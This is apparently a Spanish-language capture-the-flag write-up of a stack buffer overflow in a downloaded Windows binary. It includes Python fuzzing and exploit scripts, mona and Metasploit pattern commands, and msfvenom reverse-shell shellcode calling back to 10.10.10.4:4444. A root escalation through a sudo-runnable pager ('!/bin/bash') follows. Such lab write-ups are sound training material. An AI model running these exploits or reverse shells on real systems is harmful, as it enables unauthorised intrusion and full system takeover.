Hacemos un escaneo de nmap y encontramos dos puertos abiertos
![[Pasted image 20240710072711.png]]

Accedemos desde el navegador al servidor que aparece abiero por el puerto 10000
![[Pasted image 20240710073001.png]]

Ahora realizaremos fuzzing web para enumerar el servicio
![[Pasted image 20240710073241.png]]

Encontramos el siguiente directorio, al acceder nos encontramos con un binario, lo descargamos para analizarlo
![[Pasted image 20240710073345.png]]

Ahora nos transferimos el binario a la maquina windows
![[Pasted image 20240710073459.png]]
![[Pasted image 20240710073538.png|500]]

Lo ejecutamos y podemos comprobar que nos abre el puerto 9999
![[Pasted image 20240710073802.png]]

Ahora ejecutaremo la herramienta `Inmunity Debugger`  en la máquina windows para monitorear el programa, ya que el objetivo es ejecutar el binario para identificar si dispone de alguna vulnerabilidad que permita lanzar un shellcode contra nuestro verdadero target
![[Pasted image 20240710074019.png]]

Ejecutamos el programa en inmunity debugger y si volvemos a escanear con nmap podemos ver que abre el puerto 9999
![[Pasted image 20240710074224.png]]
![[Pasted image 20240710074243.png]]

Necesitaremos descargarnos el script de mona para poder hacer buffer overflow
```
https://github.com/corelan/mona/blob/master/mona.py
```
![[Pasted image 20240710074457.png]]

Y lo pegamos en la carpeta de `PyCommands` de Inmunity debugger 
```
C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
```
![[Pasted image 20240710074709.png]]

El siguiente paso será establecer un directorio de trabajo donde vamos a trabajar con el inmunity debugger, por lo que hay que ejecutar el siguiente comando:
```python
!mona config -set workingfolder C:\Users\wolf\Desktop\bof
```
![[Pasted image 20240710074955.png]]

El siguiente paso será utilizar un script de python para realizar el fuzzing para ir probando en qué punto se crashea el programa:
```python
#!/usr/bin/env python3
  
import socket, time, sys

ip = ""  
port = 9999
timeout = 1
prefix = ""
  
string = prefix + "A" * 100
  
while True:
   try:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
       s.settimeout(timeout)
       s.connect((ip, port))
       s.recv(1024)
       print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
       s.send(bytes(string, "latin-1"))
       s.recv(1024)
   except:
     print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
     sys.exit(0)
   string += 100 * "A"
   time.sleep(1)
```

Lo ejecutamos y vemos que el programa crashea
![[Pasted image 20240710075415.png]]
![[Pasted image 20240710075507.png]]

Una vez ejecutado vemos que el EIP marca 414141, lo cual es lo que debe ocurrir (el EIP consiste en la dirección de la próxima instrucción que se ejecutará):
![[Pasted image 20240710075645.png]]

## OBTENER EL OFFSET
Una vez obtenido el punto exacto donde crashea el programa, vamos a necesitar el offset, lo cual consiste en la cantidad de bytes que hay desde el comienzo del búfer hasta el punto donde se produce el desbordamiento.

Y para ello vamos a enviar un número de esa data algo mayor, por lo que por ejemplo vamos a sumar +400 bytes, por lo que si el programa crasheaba a los 600, le añadimos unos +400 que hacen 1000.

Para este punto, vamos a necesitar otro script de python, que será el siguiente:
```python
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Y ahora en nuestra terminal vamos a ejecutar un módulo de metasploit llamado pattern_create.rb donde insertaremos los 1000 bytes:
```python
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```
![[Pasted image 20240710080034.png]]

Y lo pegamos en el apartado de `Payload` dentro del script creado previamente
![[Pasted image 20240710080355.png]]

Ahora nos dirigimos al Immunity Debugger y ejecutamos el siguiente comando de mona, ponemos 600 porque es donde el programa crashea:
```python
!mona findmsp -distance 600
```
![[Pasted image 20240710080505.png]]

Ejecutamos el exploit
![[Pasted image 20240710080529.png]]

Y ahora si volvemos al inmunity debugger deberia de aparecernos el sigueinte EIP 
![[Pasted image 20240710080605.png]]

Una vez obtenido este número de EIP, ya podemos obtener el offset ejecutando este comando:
```python
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 72413172
```
![[Pasted image 20240710080703.png]]

Lo añadimos a nuestro exploit y añadimos `BBBB` al campo `retn`
![[Pasted image 20240710081233.png]]

Volvemos a ejecutar el exploit
![[Pasted image 20240710081330.png]]

Y ahora deberia aparecernos el siguiente EIP
![[Pasted image 20240710081357.png]]

## BAD CHARS
El siguiente paso será obtener los bad chars, lo cual consiste en que para ciertos servicios existen algunos caracteres que no se aceptan, provocando una ejecución errónea cuando generamos la shellcode. Estos caracteres se denomina bad character y debemos de eliminarlos de nuestro exploit.

Para testearlo, vamos a instalar la librería badchars de python:
![[Pasted image 20240710081652.png]]
![[Pasted image 20240710084059.png]]

Con el siguiente comando generamos los badchars totales
```
badchars -f python
```
![[Pasted image 20240710084450.png]]

Y añadimos todo el contenido al apartado de payload de nuestro exploit
![[Pasted image 20240710084645.png]]

Y ahora vamos ejecutar el siguiente comando en el Immunity `!mona bytearray -b "\x00"` para que tenga un archivo con el que comparar el de la aplicación, y si hay algún bad char nos lo llegaría a mostrar:
```
!mona bytearray -b "\x00"
```
![[Pasted image 20240710090941.png]]

Y vemos que se nos guarda este reporte en el archivo llamado bytearray (gracias a que al principio del todo hemos establecido el entorno de trabajo)
![[Pasted image 20240710090956.png]]

Reiniciamos el binario
![[Pasted image 20240710091128.png]]

Volvemos a ejecutar el exploit
![[Pasted image 20240710091423.png]]

Y al volver al inmunity podemos ver que obtenemos el ESP
![[Pasted image 20240710092139.png]]

Una vez obtenido el número de ESP, ejecutamos el siguiente comando para comprobar la existencia de bad characters
```python
!mona compare -f C:\Users\wolf\Desktop\bof\bytearray.bin -a 025FF880
```
![[Pasted image 20240710092557.png]]

Al ejecutarlo se nos abrira la siguiente pestaña
![[Pasted image 20240710092435.png]]

Y no tenemos ningún bad char (a excepción del \x00 que ese siempre es bad char)
![[Pasted image 20240710092501.png]]

En caso de que nos hubiera mostrado algun badchar tendriamos que eliminarlo del payload
![[Pasted image 20240710092708.png]]

## POINTER
Ahora tenemos que darle un punto de salto donde ejecutar, es decir, con el pointer el atacante puede dirigir la ejecución del programa hacia código malicioso, por lo que con este comando estaríamos buscando las instrucciones de "jmp esp". Por lo que ejecutamos el siguiente comando, con los badchars que nos haya aparecido anteriormente (en nuestro caso cómo mínimo es el x00 ya que este número siempre es un bad char):
```python
!mona jmp -r esp -cpb "\x00"
```

Y nos mostrara el pointer
![[Pasted image 20240710094330.png]]

Volvemos a ejecutar el binario pero clickando a la flecha apuntando a la derecha para poder añadir nuestro pointer
![[Pasted image 20240710094446.png]]

Añadimos el pointer
![[Pasted image 20240710094543.png]]

Damos el OK y nos fijamos en el siguiente campo
![[Pasted image 20240710094700.png]]


## GENERAR SHELLCODE
Ahora ya lo tenemos todo preparado para generar el shellcode, por lo que usaremos msfvenom de la siguiente forma:
```python
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.4 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```
![[Pasted image 20240710102436.png]]

Pegamos el resultado en el payload
![[Pasted image 20240710102413.png]]

Y cambiamos las siguientes variables, donde la variable retn es el número del jmp `311712F3`  pero al revés; y el padding significa el conjunto de datos adicionales que se añaden a la estructura de datos.
```python
retn= "\xf3\x12\x17\x31"
padding = "\x90" * 16
```
![[Pasted image 20240710100031.png]]

Y el resultado del payload quedara así
![[Pasted image 20240710102344.png]]

Ahora nos ponemos en escucha con netcat
![[Pasted image 20240710100156.png]]

Ejecutamos el exploit
![[Pasted image 20240710100528.png]]

Y ya hemos obtenido la reverse shell
![[Pasted image 20240710102312.png]]

Una vez obtenido el acceso si revisamos el directorio en el cual estamos nos encontramos con un fichero que al ejecutarlo nos muestra los porcesos que estan escuchando
![[Pasted image 20240710105027.png]]

Ahora nos generaremos la reverse shell pero en linux
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.4 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```
![[Pasted image 20240710110029.png]]

Y ya hemos obtenido acceso con una shell de linux
![[Pasted image 20240710110011.png]]

Revisando los permisos encontramos que podemos ejecutar el siguiente binario como root sin password
![[Pasted image 20240710112135.png]]

Al ejecutar nos muestra como ejecutar el comando
![[Pasted image 20240710112207.png]]

Ejecutamos el comando
![[Pasted image 20240710112231.png]]

Al entrar en el manual escribimos la bas
```
!/bin/bash
```
![[Pasted image 20240710112311.png]]

Y al ejecutarlo ya obtenemos acceso a root
![[Pasted image 20240710112340.png]]

Obtención de b.txt
![[Pasted image 20240710112429.png]]